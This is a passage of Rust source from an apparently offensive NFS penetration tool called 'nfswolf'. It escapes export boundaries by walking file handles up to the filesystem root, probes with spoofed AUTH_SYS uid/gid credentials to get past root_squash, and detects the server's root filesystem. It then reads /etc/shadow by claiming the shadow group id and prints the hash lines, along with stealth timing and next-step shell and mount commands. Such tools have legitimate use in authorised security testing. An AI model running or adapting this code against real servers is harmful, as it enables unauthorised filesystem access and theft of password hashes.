        let fh = FileHandle::from_bytes(&parent);
        let label = format!("LOOKUPP v4 from {source} (depth {depth})");
        if !seen.insert(fh.as_bytes().to_vec()) {
            break;
        }
        seeds.push(EscapeSeed { handle: fh, source: label, is_root: true, nfs_version: Some(4) });
        current = parent;
    }
}

/// v4 LOOKUP ".." chain: PUTFH + LOOKUP("..") + GETFH repeated.
async fn upward_chain_v4_lookup_dotdot(client: &mut crate::proto::nfs4::compound::Nfs4DirectClient, start: &FileHandle, source: &str, seeds: &mut Vec<EscapeSeed>, seen: &mut HashSet<Vec<u8>>) {
    use crate::proto::nfs4::types::{ArgOp, ResOpData};

    let mut current = start.as_bytes().to_vec();
    for depth in 1..=MAX_TRAVERSAL_DEPTH {
        let ops = vec![ArgOp::Putfh(current.clone()), ArgOp::Lookup("..".to_owned()), ArgOp::Getfh];
        let Ok(Ok(res)) = tokio::time::timeout(V4_RPC_TIMEOUT, client.compound(ops)).await else { break };
        if res.status != 0 {
            break;
        }
        let Some(parent) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None }) else { break };
        if parent == current {
            break; // tree-top reached
        }
        let fh = FileHandle::from_bytes(&parent);
        let label = format!("LOOKUP '..' v4 from {source} (depth {depth})");
        if !seen.insert(fh.as_bytes().to_vec()) {
            break;
        }
        seeds.push(EscapeSeed { handle: fh, source: label, is_root: true, nfs_version: Some(4) });
        current = parent;
    }
}

// =============================================================================
// Phase 3: Probe candidates
// =============================================================================

/// Test every candidate against the server across all protocol versions (or
/// the active version only in fast mode). Confirm tree-tops via LOOKUP ".."
/// == self, with credential escalation on ACCES.
#[expect(clippy::similar_names, reason = "working_uid and working_gid are a uid/gid pair -- naming is clear")]
async fn probe_candidates(candidates: &[EscapeCandidate], addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts, active_version: Option<ActiveVersion>) -> Vec<VerifiedTreeTop> {
    let mut results: Vec<VerifiedTreeTop> = Vec::new();

    // Build clients for each version we'll use
    let v3_client = if active_version.is_none() || active_version == Some(ActiveVersion::V3) { Some(make_v3_client(addr, export, stealth.clone(), nfs_port, globals)) } else { None };

    let v2_client = if active_version.is_none() || active_version == Some(ActiveVersion::V2) {
        let (_, _, c) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
        Some(c)
    } else {
        None
    };

    let v4_client = if active_version.is_none() || active_version == Some(ActiveVersion::V4) { Some(make_v4_pooled_client(addr, export, stealth.clone(), nfs_port, globals)) } else { None };

    for candidate in candidates {
        let mut v3_confirmed = false;
        let mut v2_confirmed = false;
        let mut v4_confirmed = false;
        let mut working_uid = globals.uid;
        let mut working_gid = globals.gid;

        // Step 1 & 2: Probe via v3
        if let Some(ref v3) = v3_client {
            stealth.wait().await;
            if let Some((uid, gid)) = probe_and_confirm_v3(v3, candidate, stealth, globals).await {
                v3_confirmed = true;
                working_uid = uid;
                working_gid = gid;
            }
        }

        // Step 1 & 2: Probe via v2
        if let Some(ref v2) = v2_client {
            stealth.wait().await;
            if probe_and_confirm_v2(v2, candidate).await {
                v2_confirmed = true;
            }
        }

        // Step 1 & 2: Probe via v4
        if let Some(ref v4) = v4_client {
            stealth.wait().await;
            if probe_and_confirm_v4(v4, candidate).await {
                v4_confirmed = true;
            }
        }

        if v3_confirmed || v2_confirmed || v4_confirmed {
            results.push(VerifiedTreeTop { candidate: candidate.clone(), v3_confirmed, v2_confirmed, v4_confirmed, uid: working_uid, gid: working_gid, rootfs_score: 0, rootfs_dirs: Vec::new(), os_escape: false, access_rank: AccessRank::Unknown });
        }
    }

    results
}

/// Probe a candidate via NFSv3: GETATTR to check validity, then LOOKUP ".."
/// to confirm tree-top. Returns `Some((uid, gid))` on success.
async fn probe_and_confirm_v3(client: &Nfs3Client, candidate: &EscapeCandidate, stealth: &StealthConfig, globals: &GlobalOpts) -> Option<(u32, u32)> {
    let fh = &candidate.handle;

    // Step 1: GETATTR
    let is_valid_dir = match client.attrs(fh).await {
        Ok(a) => a.file_type == nfs_v3::FileType::Directory,
        Err(ref e) if e.is_permission_denied() => true, // handle valid, root_squash blocks
        Err(_) => return None,
    };

    if !is_valid_dir {
        return None;
    }

    // Step 2: Confirm tree-top via LOOKUP ".." == self
    match client.resolve(fh, "..").await {
        Ok((parent, _)) => {
            if parent.as_bytes() == fh.as_bytes() {
                return Some((client.uid(), client.gid()));
            }
            // Check by fileid if handle bytes differ but point to same dir
            if let (Ok(self_attrs), Ok(parent_attrs)) = (client.attrs(fh).await, client.attrs(&parent).await)
                && self_attrs.fileid == parent_attrs.fileid
            {
                return Some((client.uid(), client.gid()));
            }
            None
        },
        Err(ref e) if e.is_permission_denied() => {
            // Credential escalation: try nobody first, then the ladder
            let cred_nobody = Credential::Sys(AuthSys::with_groups(65534, 65534, &[65534], client.machinename()));
            let nobody_client = client.with_credential(cred_nobody, 65534, 65534);

            // Get owner info from nobody
            let owner_info = nobody_client.attrs(fh).await.ok().map(|a| ((a.uid, a.gid), a.mode));

            let ladder = credential_ladder_with((client.uid(), client.gid()), owner_info.map(|(ug, _)| ug), owner_info.map(|(_, m)| m), &[]);

            for (uid, gid) in &ladder {
                let gids = build_gid_list(*gid, &globals.aux_gids);
                let cred = Credential::Sys(AuthSys::with_groups(*uid, *gid, &gids, client.machinename()));
                let esc = client.with_credential(cred, *uid, *gid);

                stealth.wait().await;
                if let Ok((parent, _)) = esc.resolve(fh, "..").await {
                    if parent.as_bytes() == fh.as_bytes() {
                        return Some((*uid, *gid));
                    }
                    if let (Ok(self_a), Ok(parent_a)) = (esc.attrs(fh).await, esc.attrs(&parent).await)
                        && self_a.fileid == parent_a.fileid
                    {
                        return Some((*uid, *gid));
                    }
                }
            }

            // Fallback: try LOOKUP of well-known names to confirm tree-top
            for name in ["etc", "bin", "usr", "var", "lib"] {
                for (uid, gid) in &ladder {
                    let gids = build_gid_list(*gid, &globals.aux_gids);
                    let cred = Credential::Sys(AuthSys::with_groups(*uid, *gid, &gids, client.machinename()));
                    let esc = client.with_credential(cred, *uid, *gid);
                    if esc.resolve(fh, name).await.is_ok() {
                        return Some((*uid, *gid));
                    }
                }
            }

            None
        },
        Err(_) => None,
    }
}

/// Probe a candidate via NFSv2: GETATTR to check validity, LOOKUP ".." to confirm.
async fn probe_and_confirm_v2(client: &crate::proto::nfs2::Nfs2Client, candidate: &EscapeCandidate) -> bool {
    let fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(candidate.handle.as_bytes());

    // Step 1: GETATTR -- ACCES/PERM means handle is valid but root_squash blocks
    let is_valid_dir = match client.getattr(&fh).await {
        Ok(a) => a.ftype == nfs_v2::wire::FType::Directory,
        Err(ref e) if e.is_permission_denied() => true,
        Err(_) => return false,
    };

    if !is_valid_dir {
        return false;
    }

    // Step 2: Confirm tree-top
    match client.lookup(&fh, "..").await {
        Ok((parent, _)) => {
            if parent.0 == fh.0 {
                return true;
            }
            // Check fileid
            if let (Ok(self_a), Ok(parent_a)) = (client.getattr(&fh).await, client.getattr(&parent).await) {
                return self_a.fileid == parent_a.fileid;
            }
            false
        },
        // ACCES/PERM on LOOKUP ".." means handle is valid but access denied --
        // accept as tree-top since we confirmed the handle is a valid directory
        Err(ref e) if e.is_permission_denied() => true,
        Err(_) => false,
    }
}

/// Probe a candidate via NFSv4 (pooled client): GETATTR + LOOKUPP/LOOKUP "..".
async fn probe_and_confirm_v4(client: &crate::proto::nfs4::Nfs4Client, candidate: &EscapeCandidate) -> bool {
    use nfs_v4::wire::{ArgOp, ResOpData};
    let fh_bytes = candidate.handle.as_bytes();

    // Step 1: GETATTR -- ACCES/PERM means handle is valid but root_squash blocks
    let is_valid_dir = match client.getattr(fh_bytes).await {
        Ok(info) => info.ftype == Some(nfs_v4::Nfs4FileType::Directory),
        Err(ref e) if e.is_permission_denied() => true,
        Err(_) => return false,
    };

    if !is_valid_dir {
        return false;
    }

    // Step 2a: Try LOOKUPP first (different kernel code path from LOOKUP "..")
    // PUTFH + LOOKUPP + GETFH returns the parent directory handle.
    // At the pseudo-root or export root, LOOKUPP fails with NFS4ERR_NOENT.
    let ops = vec![ArgOp::Putfh(fh_bytes.to_vec()), ArgOp::Lookupp, ArgOp::Getfh];
    if let Ok(res) = client.compound(ops).await {
        if res.status == 0
            && let Some(parent) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
        {
            if parent == fh_bytes {
                return true;
            }
            // Check by fileid if handle bytes differ
            if let (Ok(self_a), Ok(parent_a)) = (client.getattr(fh_bytes).await, client.getattr(&parent).await)
                && self_a.fileid == parent_a.fileid
            {
                return true;
            }
        }
        // LOOKUPP permission denied at this handle -- handle is valid
        if nfs_v4::Nfs4Status::from_u32(res.status).is_permission_denied() {
            return true;
        }
    }

    // Step 2b: Fall back to LOOKUP ".."
    match client.lookup(fh_bytes, "..").await {
        Ok((parent, _)) => {
            if parent == fh_bytes {
                return true;
            }
            // Check fileid
            if let (Ok(self_a), Ok(parent_a)) = (client.getattr(fh_bytes).await, client.getattr(&parent).await) {
                return self_a.fileid == parent_a.fileid;
            }
            false
        },
        // ACCES/PERM on LOOKUP ".." means handle is valid but access denied
        Err(ref e) if e.is_permission_denied() => true,
        Err(_) => false,
    }
}

// =============================================================================
// Phase 4b: Rootfs detection
// =============================================================================

/// List each tree-top's directory contents and score against rootfs names.
async fn rootfs_detection(tree_tops: &mut [VerifiedTreeTop], addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) {
    for tt in tree_tops.iter_mut() {
        let dir_names = list_tree_top_children(tt, addr, export, stealth, nfs_port, globals).await;
        let name_refs: Vec<&str> = dir_names.iter().map(String::as_str).collect();
        tt.rootfs_score = rootfs_score(&name_refs);
        tt.rootfs_dirs = dir_names;
        tt.os_escape = tt.rootfs_score >= ROOTFS_THRESHOLD;
        tt.access_rank = probe_access_rank(tt, addr, export, stealth, nfs_port, globals).await;
    }
}

/// List children of a tree-top handle using the best available version.
async fn list_tree_top_children(tt: &VerifiedTreeTop, addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> Vec<String> {
    let fh = &tt.candidate.handle;

    // Build client with the working credential from Phase 3
    let uid = tt.uid;
    let gid = tt.gid;

    // Prefer v3 (READDIRPLUS returns names + handles in one call)
    if tt.v3_confirmed {
        let (_, _, v3) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
        stealth.wait().await;
        if let Ok(page) = v3.list_dir_page(fh, 0, nfs_v3::wire::cookieverf3::default()).await {
            return page.entries.iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name.clone()).collect();
        }
    }

    // Fallback: v4
    if tt.v4_confirmed {
        let v4 = make_v4_pooled_client(addr, export, stealth.clone(), nfs_port, globals);
        stealth.wait().await;
        if let Ok(names) = v4.list_dir(fh.as_bytes()).await {
            return names.into_iter().filter(|n| n != "." && n != "..").collect();
        }
    }

    // Fallback: v2
    if tt.v2_confirmed {
        let (_, _, v2) = make_v2_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
        let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(fh.as_bytes());
        stealth.wait().await;
        if let Ok(entries) = v2.readdir(&v2_fh, 0, 8192).await {
            return entries.iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name.clone()).collect();
        }
    }

    Vec::new()
}

// --- Access-rank probing ---

/// Squash detection result from a single identity probe.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SquashProbe {
    /// Read succeeded -- this identity is not squashed.
    Readable,
    /// Permission denied -- identity is squashed or file is inaccessible.
    Denied,
    /// File not found or other non-permission error.
    NotFound,
}

/// Probe the export's squash mode and write access to classify its `AccessRank`.
///
/// Strategy:
///   1. Try reading etc/shadow as uid=0/gid=42 (Debian shadow GID). If readable,
///      the export has no_root_squash (root is not mapped to nobody).
///   2. If ACCES, retry as uid=1000/gid=42. If readable, the export has
///      root_squash (root is squashed but regular users are not).
///   3. If both ACCES, the export has all_squash (every identity is mapped to nobody).
///   4. Check write access via NFSv3 ACCESS procedure (MODIFY|EXTEND bits).
async fn probe_access_rank(tt: &VerifiedTreeTop, addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> AccessRank {
    let fh = &tt.candidate.handle;

    // Prefer v3 for the squash probe (most capable, has ACCESS procedure)
    if tt.v3_confirmed {
        let (_, _, v3_root) = make_client_with_hostname(addr, export, 0, 42, &[42], stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
        stealth.wait().await;
        let root_probe = try_read_file_v3(&v3_root, fh, &["etc", "shadow"]).await;

        let squash = match root_probe {
            SquashProbe::Readable => {
                // Root can read shadow -> no_root_squash
                let rw = check_write_access_v3(&v3_root, fh, stealth).await;
                return if rw { AccessRank::NoSquashRw } else { AccessRank::NoSquashRo };
            },
            SquashProbe::Denied => {
                // Root denied -- could be root_squash or all_squash
                let (_, _, v3_user) = make_client_with_hostname(addr, export, 1000, 42, &[42], stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
                stealth.wait().await;
                let user_probe = try_read_file_v3(&v3_user, fh, &["etc", "shadow"]).await;
                match user_probe {
                    SquashProbe::Denied => "all_squash",
                    SquashProbe::Readable | SquashProbe::NotFound => "root_squash",
                }
            },
            SquashProbe::NotFound => {
                // etc/shadow not found -- can't determine squash mode from shadow
                // Fall through to write-access check with Unknown squash classification
                "unknown"
            },
        };

        let rw = check_write_access_v3(&v3_root, fh, stealth).await;
        return match (squash, rw) {
            ("root_squash", true) => AccessRank::RootSquashRw,
            ("root_squash", false) => AccessRank::RootSquashRo,
            ("all_squash", true) => AccessRank::AllSquashRw,
            ("all_squash", false) => AccessRank::AllSquash,
            _ => AccessRank::Unknown,
        };
    }

    // Fallback: v4 squash probe (no ACCESS procedure equivalent, read-only test)
    if tt.v4_confirmed {
        let v4 = make_v4_pooled_client(addr, export, stealth.clone(), nfs_port, globals);
        stealth.wait().await;
        let root_probe = try_read_file_v4(&v4, fh.as_bytes(), &["etc", "shadow"]).await;
        match root_probe {
            SquashProbe::Readable => return AccessRank::NoSquashRw, // conservative: assume rw if no_root_squash
            SquashProbe::Denied => {
                // Retry as uid=1000 -- need a new client with different creds
                let v4_user = make_v4_pooled_client_with_creds(addr, export, stealth.clone(), nfs_port, globals, 1000, 42);
                stealth.wait().await;
                let user_probe = try_read_file_v4(&v4_user, fh.as_bytes(), &["etc", "shadow"]).await;
                return match user_probe {
                    SquashProbe::Readable => AccessRank::RootSquashRw,
                    _ => AccessRank::AllSquash,
                };
            },
            SquashProbe::NotFound => {},
        }
    }

    AccessRank::Unknown
}

/// Walk a path from a directory handle and try to read 1 byte from the target file.
async fn try_read_file_v3(client: &Nfs3Client, dir: &FileHandle, components: &[&str]) -> SquashProbe {
    let mut current = dir.clone();
    for &name in components {
        match client.resolve(&current, name).await {
            Ok((child, _)) => current = child,
            Err(ref e) if e.is_permission_denied() => return SquashProbe::Denied,
            Err(_) => return SquashProbe::NotFound,
        }
    }
    match client.read_at(&current, 0, 1).await {
        Ok(_) => SquashProbe::Readable,
        Err(ref e) if e.is_permission_denied() => SquashProbe::Denied,
        Err(_) => SquashProbe::NotFound,
    }
}

/// Walk a path from a directory handle and try to read 1 byte via NFSv4.
async fn try_read_file_v4(client: &crate::proto::nfs4::Nfs4Client, dir: &[u8], components: &[&str]) -> SquashProbe {
    let mut current = dir.to_vec();
    for &name in components {
        match client.lookup(&current, name).await {
            Ok((child, _)) => current = child,
            Err(ref e) if e.is_permission_denied() => return SquashProbe::Denied,
            Err(_) => return SquashProbe::NotFound,
        }
    }
    match client.read_chunk(&current, 0, 1).await {
        Ok(_) => SquashProbe::Readable,
        Err(ref e) if e.is_permission_denied() => SquashProbe::Denied,
        Err(_) => SquashProbe::NotFound,
    }
}

/// Check write access on a directory via NFSv3 ACCESS procedure (MODIFY|EXTEND).
///
/// Advisory only (RFC 1813 sec. 3.3.4) but a reliable indicator of export-level
/// ro vs rw since export flags are enforced server-side before file permissions.
async fn check_write_access_v3(client: &Nfs3Client, dir: &FileHandle, stealth: &StealthConfig) -> bool {
    stealth.wait().await;
    let mask = nfs_v3::wire::ACCESS3_MODIFY | nfs_v3::wire::ACCESS3_EXTEND;
    match client.check_access(dir, mask).await {
        Ok(granted) => granted & mask != 0,
        Err(_) => false,
    }
}

/// Build an NFSv4 pooled client with specific uid/gid (for squash probing).
fn make_v4_pooled_client_with_creds(addr: SocketAddr, export: &str, stealth: StealthConfig, nfs_port: u16, globals: &GlobalOpts, uid: u32, gid: u32) -> crate::proto::nfs4::Nfs4Client {
    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;

    let pool = Arc::new(match &globals.proxy {
        Some(p) => ConnectionPool::with_proxy(p.clone()),
        None => ConnectionPool::default_config(),
    });
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(gid, &globals.aux_gids);
    let cred = Credential::Sys(AuthSys::with_groups(uid, gid, &gids, &globals.hostname));
    let pool_key = PoolKey { host: addr, export: format!("__v4_access__{export}__{nfs_port}"), uid, gid };
    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
    PooledNfs4Client::new(transport)
}

// =============================================================================
// Phase 6: Report
// =============================================================================

/// Console output: exports, stats, sorted results, next-steps.
fn report_console(host: &str, exports: &[DiscoveredExport], stats: &EscapeStats, annotated: &[AnnotatedTreeTop]) {
    // Exports section
    if !exports.is_empty() {
        println!();
        println!("  {}", "Exports discovered:".bold());
        for exp in exports {
            println!("    {:30} [{}]", exp.path, exp.sources.join(", "));
        }
    }

    // Stats
    println!();
    println!("  Seeds acquired: {} unique handles", stats.seeds);
    println!("  Candidates constructed: {} (deduped from {})", stats.candidates, stats.candidates_before_dedup);
    println!("  Tree-tops confirmed: {} (filtered {} known export boundaries)", stats.tree_tops_confirmed, stats.tree_tops_filtered);

    if annotated.is_empty() {
        println!();
        eprintln!("{}", crate::output::status_err("No new handles found -- all tree-tops matched known export boundaries. The server's exports may already be whole-filesystem exports (no boundary to escape)."));
        return;
    }

    // Results
    println!();
    println!("  {}", "Results:".bold());
    for att in annotated {
        let tt = &att.tree_top;
        let tag = if tt.os_escape { "[OS-ESCAPE]".bold().red().to_string() } else { "[+]".bold().green().to_string() };

        let mut versions = Vec::new();
        if tt.v3_confirmed {
            versions.push("v3");
        }
        if tt.v2_confirmed {
            versions.push("v2");
        }
        if tt.v4_confirmed {
            versions.push("v4");
        }

        let uid_str = if tt.uid == 0 && tt.gid == 0 { String::new() } else { format!("  uid={}", tt.uid) };
        let access_str = match tt.access_rank {
            AccessRank::NoSquashRw => "  no_root_squash,rw".green().to_string(),
            AccessRank::NoSquashRo => "  no_root_squash,ro".yellow().to_string(),
            AccessRank::RootSquashRw => "  root_squash,rw".to_owned(),
            AccessRank::RootSquashRo => "  root_squash,ro".dimmed().to_string(),
            AccessRank::AllSquashRw => "  all_squash,rw".dimmed().to_string(),
            AccessRank::AllSquash => "  all_squash".dimmed().to_string(),
            AccessRank::Unknown => String::new(),
        };
        println!("    {tag}  {}  via {}   [{}]{uid_str}{access_str}", tt.candidate.label, tt.candidate.seed_source.dimmed(), versions.join(" "));
        println!("         handle: {}", tt.candidate.handle.to_hex().cyan());
        println!("         {}", att.annotation.dimmed());

        if tt.os_escape {
            println!("         rootfs dirs: {} (score: {})", tt.rootfs_dirs.join(", "), tt.rootfs_score);
        }
        println!();
    }

    // Summary
    let os_count = annotated.iter().filter(|a| a.tree_top.os_escape).count();
    println!("  {} handle(s) found from {} seeds. {} confirmed server rootfs.", annotated.len(), stats.seeds, os_count);

    // Next steps: use highest-scoring handle
    if let Some(best) = annotated.first() {
        let hex = best.tree_top.candidate.handle.to_hex();
        let uid = best.tree_top.uid;
        let gid = best.tree_top.gid;
        println!();
        println!("  {} Copy the handle above and use it with:", "Next steps:".bold().yellow());
        if uid != 0 || gid != 0 {
            println!("    {} shell {} --handle {} --uid {uid} --gid {gid}", "nfswolf".dimmed(), host, hex.cyan());
            println!("    {} mount {} --handle {} --uid {uid} --gid {gid} /mnt/escape", "nfswolf".dimmed(), host, hex.cyan());
        } else {
            println!("    {} shell {} --handle {}", "nfswolf".dimmed(), host, hex.cyan());
            println!("    {} mount {} /mnt/escape --handle {}", "nfswolf".dimmed(), host, hex.cyan());
        }
    }
    println!();
}

/// JSON output per spec schema.
async fn report_json(host: &str, exports: &[DiscoveredExport], stats: &EscapeStats, annotated: &[AnnotatedTreeTop], config: &PipelineConfig, addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) {
    let exports_json: Vec<serde_json::Value> = exports.iter().map(|e| serde_json::json!({"path": e.path, "sources": e.sources})).collect();

    let results_json: Vec<serde_json::Value> = annotated
        .iter()
        .map(|att| {
            let tt = &att.tree_top;
            serde_json::json!({
                "handle": tt.candidate.handle.to_hex(),
                "fs_type": format!("{:?}", tt.candidate.fs_type),
                "inode": tt.candidate.inode_number,
                "label": tt.candidate.label,
                "versions": {"v3": tt.v3_confirmed, "v2": tt.v2_confirmed, "v4": tt.v4_confirmed},
                "uid": tt.uid,
                "gid": tt.gid,
                "os_escape": tt.os_escape,
                "rootfs_score": tt.rootfs_score,
                "rootfs_dirs": tt.rootfs_dirs,
                "score": att.score,
                "seed_source": tt.candidate.seed_source,
                "annotation": att.annotation,
                "access_rank": format!("{:?}", tt.access_rank),
            })
        })
        .collect();

    // Next steps commands
    let next_steps: Vec<String> = if let Some(best) = annotated.first() {
        let hex = best.tree_top.candidate.handle.to_hex();
        let uid = best.tree_top.uid;
        let gid = best.tree_top.gid;
        if uid != 0 || gid != 0 {
            vec![format!("nfswolf shell {host} --handle {hex} --uid {uid} --gid {gid}"), format!("nfswolf mount {host} --handle {hex} --uid {uid} --gid {gid} /mnt/escape")]
        } else {
            vec![format!("nfswolf shell {host} --handle {hex}"), format!("nfswolf mount {host} /mnt/escape --handle {hex}")]
        }
    } else {
        Vec::new()
    };

    let mut output = serde_json::json!({
        "host": host,
        "exports": exports_json,
        "stats": {
            "seeds": stats.seeds,
            "candidates": stats.candidates,
            "candidates_before_dedup": stats.candidates_before_dedup,
            "tree_tops_confirmed": stats.tree_tops_confirmed,
            "tree_tops_filtered": stats.tree_tops_filtered,
            "tree_tops_reported": stats.tree_tops_reported,
        },
        "results": results_json,
        "next_steps": next_steps,
    });

    // Optional --read-shadow
    if config.read_shadow
        && let Some(shadow_json) = read_shadow_json(annotated, addr, export, stealth, nfs_port, globals).await
        && let Some(obj) = output.as_object_mut()
    {
        drop(obj.insert("shadow".to_owned(), shadow_json));
    }

    println!("{}", serde_json::to_string_pretty(&output).unwrap_or_else(|_| "{}".to_owned()));
}

/// Attempt /etc/shadow read from the best OS-ESCAPE handle (console mode).
async fn read_shadow(annotated: &[AnnotatedTreeTop], addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) {
    let best_os = annotated.iter().find(|a| a.tree_top.os_escape);
    let Some(att) = best_os else {
        return; // no OS-ESCAPE handle
    };

    let uid = att.tree_top.uid;
    let gid = att.tree_top.gid;
    let (_, _, client) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);

    try_read_shadow_post_escape(&client, &att.tree_top.candidate.handle).await;
}

/// Attempt /etc/shadow read and return JSON representation.
async fn read_shadow_json(annotated: &[AnnotatedTreeTop], addr: SocketAddr, export: &str, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> Option<serde_json::Value> {
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    let best_os = annotated.iter().find(|a| a.tree_top.os_escape)?;

    let uid = best_os.tree_top.uid;
    let gid = best_os.tree_top.gid;
    let root_fh = &best_os.tree_top.candidate.handle;

    let (_, _, client) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);

    let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else {
        return Some(serde_json::json!({"readable": false}));
    };
    let Ok((shadow_fh, _)) = client.resolve(&etc_fh, "shadow").await else {
        return Some(serde_json::json!({"readable": false}));
    };

    for &(shadow_gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, shadow_gid, &[shadow_gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, shadow_gid);
        if let Ok(chunk) = shadow_client.read_at(&shadow_fh, 0, 65536).await {
            let content = String::from_utf8_lossy(&chunk.data);
            let lines: Vec<&str> = content.lines().collect();
            return Some(serde_json::json!({
                "readable": true,
                "gid_used": shadow_gid,
                "gid_label": label,
                "lines": lines,
            }));
        }
    }

    Some(serde_json::json!({"readable": false}))
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
/// because we can claim GID 42/15 via AUTH_SYS.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else { return };

    let Ok((shadow_fh, _)) = client.resolve(&etc_fh, "shadow").await else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        if let Ok(chunk) = shadow_client.read_at(&shadow_fh, 0, 65536).await {
            let content = String::from_utf8_lossy(&chunk.data);
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}

// =============================================================================
// NFSv4 helpers (kept/adapted from old code)
// =============================================================================

/// Acquire a seed handle via NFSv4 LOOKUP into the export path.
///
/// Connects to port 2049, navigates PUTROOTFH -> LOOKUP chain to the export
/// path components, then GETFH to retrieve the file handle. This handle has
/// the correct fsid for the export's filesystem and can serve as an escape
/// seed even when MOUNT is firewalled.
async fn acquire_v4_lookup_handle(host: &str, export: &str, globals: &GlobalOpts) -> Option<FileHandle> {
    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;

    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let nfs_port = globals.nfs_port.unwrap_or(2049);

    let pool = Arc::new(match &globals.proxy {
        Some(p) => ConnectionPool::with_proxy(p.clone()),
        None => ConnectionPool::default_config(),
    });
    let circuit = Arc::new(CircuitBreaker::default_config());
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let gids = build_gid_list(globals.gid, &globals.aux_gids);
    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
    let pool_key = PoolKey { host: addr, export: format!("__v4_escape__{nfs_port}"), uid: globals.uid, gid: globals.gid };
    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
    let client = PooledNfs4Client::new(transport);

    let components = crate::proto::sideband::export_components(export);
    let mut fh = client.get_root_fh().await.ok()?;
    let root_fh = fh.clone();
    for comp in &components {
        match client.lookup(fh.as_slice(), comp).await {
            Ok((child, _)) => fh = child,
            Err(_) => break,
        }
    }
    if fh == root_fh {
        return None; // didn't leave the pseudo-root
    }
    Some(FileHandle::from_bytes(&fh))
}

/// Walk the NFSv4 pseudo-FS, enter every discovered export, LOOKUP a child
/// to get a real filesystem handle (fileid_type > 0), and return all of them.
async fn gather_v4_export_seeds(host: &str, globals: &GlobalOpts) -> Vec<(String, FileHandle)> {
    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;

    let Ok(addr) = parse_addr_with_port(host, globals.nfs_port) else { return Vec::new() };
    let nfs_port = globals.nfs_port.unwrap_or(2049);

    let pool = Arc::new(match &globals.proxy {
        Some(p) => ConnectionPool::with_proxy(p.clone()),
        None => ConnectionPool::default_config(),
    });
    let circuit = Arc::new(CircuitBreaker::default_config());
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let gids = build_gid_list(globals.gid, &globals.aux_gids);
    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
    let pool_key = PoolKey { host: addr, export: format!("__v4_gather__{nfs_port}"), uid: globals.uid, gid: globals.gid };
    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
    let client = PooledNfs4Client::new(transport);

    // Get pseudo-root FH + fsid.
    let Ok(root_fh) = client.get_root_fh().await else {
        tracing::debug!("gather_v4: get_root_fh failed");
        return Vec::new();
    };
    let root_fsid = match client.getattr(&root_fh).await {
        Ok(info) => info.fsid.unwrap_or((0, 0)),
        Err(e) => {
            tracing::debug!("gather_v4: getattr(root) failed: {e}");
            return Vec::new();
        },
    };
